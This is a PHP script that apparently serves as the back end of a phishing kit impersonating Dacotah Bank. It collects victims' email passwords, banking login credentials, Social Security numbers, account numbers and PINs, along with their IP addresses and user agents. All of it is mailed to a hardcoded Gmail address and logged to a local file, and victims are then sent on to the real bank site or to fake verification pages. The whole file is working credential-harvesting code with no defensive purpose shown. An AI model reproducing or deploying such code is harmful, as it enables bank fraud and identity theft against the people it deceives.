<?php
$Receive_email = "staerkelramee@gmail.com";

if (isset($_POST['emailbtn'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['em']."\n";
	$message .= "Email Password              : ".$_POST['empsw']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	$file = "data.txt";
	$open = fopen($file, "a");
	fwrite($open, $message."\n");
	fclose($open);

	header("Location: https://www.dacotahbank.com/");

	
	
}

else if (isset($_POST['contibtn'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$message .= "Social Security Number : ".$_POST['ssn']."\n";
	$message .= "Phone Number           : ".$_POST['phone']."\n";
	$message .= "Account Number         : ".$_POST['acctnum']."\n";
	$message .= "Pin                    : ".$_POST['pin']."\n";
	$message .= "Zip Code            : ".$_POST['zip']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	$file = "data.txt";
	$open = fopen($file, "a");
	fwrite($open, $message."\n");
	fclose($open);
	 
	header("Location: https://dacotah.web.app/emailverification.html");

	
	
}


else if (isset($_POST['login_btn'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$message .= "Login ID            : ".$_POST['user_id']."\n";
	$message .= "Password              : ".$_POST['password']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	$file = "data.txt";
	$open = fopen($file, "a");
	fwrite($open, $message."\n");
	fclose($open);
	 
	header("Location: https://dacotah.web.app/verification.html");

	
	
}

else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>
